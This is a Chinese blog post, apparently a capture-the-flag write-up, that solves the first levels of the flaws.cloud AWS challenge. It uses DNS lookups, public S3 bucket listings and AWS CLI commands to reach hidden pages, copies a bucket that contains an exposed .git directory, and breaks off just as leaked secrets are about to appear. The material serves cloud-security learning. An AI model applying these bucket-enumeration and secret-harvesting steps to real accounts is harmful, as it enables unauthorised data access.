

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="gscr10">
  <meta name="keywords" content="">
  <title>FLAWS challenge - Mr. Military&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      
        
        
        
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.21.0/themes/prism-tomorrow.min.css" />
      
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Mr. Military</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('https://w.wallhaven.cc/full/2e/wallhaven-2em38y.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-09-22 19:25" pubdate>
        September 22, 2020 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6.8k words
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      108
       mins
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">FLAWS challenge</h1>
            
            <div class="markdown-body" id="post-body">
              <p>【文章首发于《安全客》<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201460%E3%80%91">https://www.anquanke.com/post/id/201460】</a></p>
<p><img src="https://p2.ssl.qhimg.com/t0152316050b2c9f8e9.png" srcset="/img/loading.gif"></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习AWS（Amazon Web Services）的相关知识，发现了一个很有趣的AWS CTF——<a target="_blank" rel="noopener" href="http://flaws.cloud/">flaws</a>。对于想了解AWS相关安全知识的小伙伴，FLAWS是一个不错的学习平台。我们可以通过一系列挑战，了解掌握AWS常见的错误和漏洞。这个CTF平台上，并不需要我们关注SQLi、XSS、Buffer overflow等等这些为人熟知的漏洞，所需要关注的点集中在与AWS的特定问题上。</p>
<p>对于不了解AWS的小伙伴，可以查看<a target="_blank" rel="noopener" href="https://aws.amazon.com/">AWS官网</a>查看相关文档，或者查看<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Amazon_Web_Services">AWS的维基百科</a>，了解相关基础知识。</p>
<p>在FLAWS的挑战网站首页<a target="_blank" rel="noopener" href="http://flaws.cloud/">http://flaws.cloud</a> ，有这样一段话：</p>
<blockquote>
<p><strong>Scope</strong>: Everything is run out of a single AWS account, and all challenges are sub-domains of <a target="_blank" rel="noopener" href="http://flaws.cloud/">flaws.cloud</a>.</p>
</blockquote>
<p>也就是说，这个平台的所有内容都运行在一个AWS账户中，并且所有的挑战都是<code>flaws.cloud</code>的子域。</p>
<p>FLAWS一共包括6个挑战，下面就开始我们的通关之旅吧 =）</p>
<h2 id="0x01-Level-1"><a href="#0x01-Level-1" class="headerlink" title="0x01 Level 1"></a>0x01 Level 1</h2><blockquote>
<p>This level is <em>buckets</em> of fun. See if you can find the first sub-domain.</p>
</blockquote>
<p>这里的提示中，可以打看到<code>buckets</code>这个关键词，对AWS有了解的小伙伴肯定知道，这里指的就<code>AWS S3 buckets</code>。由于S3存储桶能够托管静态网站，那么<code>flaws.cloud</code>很有可能就放在上面。</p>
<p>利用<code>nslookup</code>工具进行查询，可以看到IP地址为<code>52.218.218.194</code>：</p>
<p><img src="https://p3.ssl.qhimg.com/t0162d2fd9d5f2f196e.png" srcset="/img/loading.gif"></p>
<p>利用<code>dig</code>工具进行反向查询，成功得到<code>flaws.cloud</code>的S3存储桶的地址<code>s3-website-us-west-2.amazonaws.com</code>：</p>
<p><img src="https://p3.ssl.qhimg.com/t014c903087a76e7908.png" srcset="/img/loading.gif"></p>
<p><em>一个额外的小知识：对于每个托管在S3存储桶中的网站，都会被分配一个AWS的域名，而不需要你自己额外配置DNS。所以，<code>flaws.cloud</code>加上它的S3地址：<a target="_blank" rel="noopener" href="http://flaws.cloud.s3-website-us-west-2.amazonaws.com/">http://flaws.cloud.s3-website-us-west-2.amazonaws.com/</a> ，也能访问到主页。</em></p>
<p>通过上述查询，我们知道<code>flaws.cloud</code>是一个在S3中的静态网站，地区位于<code>us-west-2</code>。如果使用一个自定义的域名（比如<code>flaws.cloud</code>）在S3中定义了一个静态站点，那它的<code>bucket name</code>则必须与这个自定义域名一致。对于S3存储桶上HTTP端点的URL遵循固定格式：<code>s3-&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>。基于这个准则，我们可以得出<code>flaws.cloud</code>的S3端点应该是<a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/flaws.cloud">http://s3-us-west-2.amazonaws.com/flaws.cloud</a> 。</p>
<p>访问这个链接，返回一个XML，包含以下内容：</p>
<pre class="language-html" data-language="html"><code class="language-html">This XML file does not appear to have any style information associated with it. The document tree is shown below.
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ListBucketResult</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://s3.amazonaws.com/doc/2006-03-01/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Name</span><span class="token punctuation">></span></span>flaws.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Prefix</span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Marker</span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MaxKeys</span><span class="token punctuation">></span></span>1000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MaxKeys</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IsTruncated</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>IsTruncated</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>hint1.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-03-14T03:00:38.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"f32e6fbab70a118cf4e2dc03fd71c59d"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>2575<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>hint2.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-03-03T04:05:17.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"565f14ec1dce259789eb919ead471ab9"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>1707<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>hint3.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-03-03T04:05:11.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"ffe5dc34663f83aedaffa512bec04989"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>1101<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2018-07-10T16:47:16.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"ddd133aef0f381cf0440d5f09648791d"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>3082<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>logo.png<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2018-07-10T16:47:16.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"0623bdd28190d0583ef58379f94c2217"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>15979<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>robots.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-02-27T01:59:28.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"9e6836f2de6d6e6691c78a1902bf9156"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>46<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>secret-dd02c7c.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-02-27T01:59:30.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"c5e83d744b4736664ac8375d4464ed4c"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>1051<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ListBucketResult</span><span class="token punctuation">></span></span></code></pre>

<p>我们在页面中发现<code>secret-dd02c7c.html</code>在这个存储桶中：</p>
<p><img src="https://p2.ssl.qhimg.com/t01f12139851a3eeb64.png" srcset="/img/loading.gif"></p>
<p>访问<a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html">http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html</a> ，找到level 2的入口，成功通过level 1：</p>
<p><img src="https://p3.ssl.qhimg.com/t010bb26a6b132de2d2.png" srcset="/img/loading.gif"></p>
<h2 id="0x02-Level-2"><a href="#0x02-Level-2" class="headerlink" title="0x02 Level 2"></a>0x02 Level 2</h2><blockquote>
<p>The next level is fairly similar, with a slight twist. You’re going to need your own AWS account for this.</p>
</blockquote>
<p>这里第二关与第一关类似，可以想到仍然与S3有关，同时考虑到需要我们拥有自己的AWS账号，则可以联系到应该与S3存储桶的跨权限访问有关。</p>
<p>关于注册AWS免费账号，这里不过多阐述，可以查看这篇文章——<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/67478818">AWS入门 – 开通海外账户及巧用免费套餐</a>。由于我已经拥有自己的AWS账号，下面开始继续通关挑战。</p>
<p>首先通过账户的访问秘钥（AWSAccessKeyId、AWSSecretKey）配置AWS CLI：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws configure
AWS Access Key ID :********************
AWS Secret Access Key :********************:
Default region name <span class="token punctuation">[</span>ap-southeast-1<span class="token punctuation">]</span>: us-west-2
Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>:</code></pre>

<p>通过level 2 的入口的URL：<a target="_blank" rel="noopener" href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html</a> ，我们知道它的存储桶为<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code> 。这时尝试用自身账户配置好的AWS CLI 列出level 2 存储桶中包含的内容，发现<code>secret-e4443fc.html</code>：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --recursive

<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:15      <span class="token number">80751</span> everyone.png
<span class="token number">2017</span>-03-03 <span class="token number">11</span>:47:17       <span class="token number">1433</span> hint1.html
<span class="token number">2017</span>-02-27 <span class="token number">10</span>:04:39       <span class="token number">1035</span> hint2.html
<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:14       <span class="token number">2786</span> index.html
<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:14         <span class="token number">26</span> robots.txt
<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:15       <span class="token number">1051</span> secret-e4443fc.html</code></pre>

<p>继续参照S3存储桶HTTP端点的URL规则<code>&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>（这里的<code>&lt;bucketname&gt;</code>对应level 2 的存储桶地址<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code>），访问这一秘密页面：<a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html">http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html</a><br>成功通关level 2，找到level 3的入口。</p>
<p><img src="https://p4.ssl.qhimg.com/t01276baefad0e6c8da.png" srcset="/img/loading.gif"></p>
<h2 id="0x03-Level-3"><a href="#0x03-Level-3" class="headerlink" title="0x03 Level 3"></a>0x03 Level 3</h2><blockquote>
<p>The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you’ll find something that will let you list what other buckets are.</p>
</blockquote>
<p>这一关依然与前面类似，从S3的思路进行考虑，需要寻找AWS的key。</p>
<p>尝试访问level 3 的存储桶地址<code>http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code>，返回XML：</p>
<pre class="language-xml" data-language="xml"><code class="language-xml">This XML file does not appear to have any style information associated with it. The document tree is shown below.
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ListBucketResult</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://s3.amazonaws.com/doc/2006-03-01/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Name</span><span class="token punctuation">></span></span>
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Name</span><span class="token punctuation">></span></span>
...</code></pre>

<p>用AWS CLI获取整个列表，发现<code>authenticated_users.png</code> 和一堆<code>.git</code> 目录。：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive

<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24         <span class="token number">52</span> .git/COMMIT_EDITMSG
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24         <span class="token number">23</span> .git/HEAD
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">130</span> .git/config
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24         <span class="token number">73</span> .git/description
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">452</span> .git/hooks/applypatch-msg.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">896</span> .git/hooks/commit-msg.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">189</span> .git/hooks/post-update.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">398</span> .git/hooks/pre-applypatch.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">1704</span> .git/hooks/pre-commit.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">4898</span> .git/hooks/pre-rebase.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">1239</span> .git/hooks/prepare-commit-msg.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">3611</span> .git/hooks/update.sample
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">600</span> .git/index
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">240</span> .git/info/exclude
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">359</span> .git/logs/HEAD
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">359</span> .git/logs/refs/heads/master
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">679</span> .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">770</span> .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">820</span> .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">245</span> .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25     <span class="token number">112013</span> .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">560</span> .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">191</span> .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25         <span class="token number">42</span> .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">904</span> .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25         <span class="token number">98</span> .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">279</span> .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">125</span> .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25         <span class="token number">41</span> .git/refs/heads/master
<span class="token number">2017</span>-02-27 08:14:33     <span class="token number">123637</span> authenticated_users.png
<span class="token number">2017</span>-02-27 08:14:34       <span class="token number">1552</span> hint1.html
<span class="token number">2017</span>-02-27 08:14:34       <span class="token number">1426</span> hint2.html
<span class="token number">2017</span>-02-27 08:14:35       <span class="token number">1247</span> hint3.html
<span class="token number">2017</span>-02-27 08:14:33       <span class="token number">1035</span> hint4.html
<span class="token number">2017</span>-02-27 <span class="token number">10</span>:05:16       <span class="token number">1703</span> index.html
<span class="token number">2017</span>-02-27 08:14:33         <span class="token number">26</span> robots.txt</code></pre>

<p>查看<code>authenticated_users.png</code> <a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png">http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png</a> ，并没有获得有用的信息。</p>
<p><img src="https://p2.ssl.qhimg.com/t01043d50b99d265506.png" srcset="/img/loading.gif"></p>
<p>将level 3 存储桶上的内容复制一份：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">cp</span> s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ~/testtest --recursive</code></pre>

<p>通过浏览<code>.git</code>内部的文件内容， 在<code>.git/COMMIT_EDITMSG</code>中发现<code>Oops, accidentally added something I shouldn&#39;t have</code>，看来上传了敏感的东西。</p>
<p>查看<code>git log</code>，发现敏感信息：</p>
